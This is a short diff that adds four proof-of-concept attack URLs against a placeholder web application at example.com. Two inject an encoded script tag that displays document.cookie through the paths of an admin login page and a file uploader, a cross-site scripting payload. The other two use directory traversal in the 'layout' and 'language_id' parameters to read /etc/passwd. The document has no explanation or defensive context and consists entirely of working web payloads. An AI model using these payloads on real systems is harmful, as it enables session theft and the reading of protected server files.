@@ -1,0 +1,4 @@
+http://www.example.com/demo/admin/auth.php/&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+http://www.example.com/demo/file_uploader.php/&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+http://www.example.com/?layout=../../../../../../../../etc/passwd
+http://www.example.com/?language_id=../../../../../../../../etc/passwd
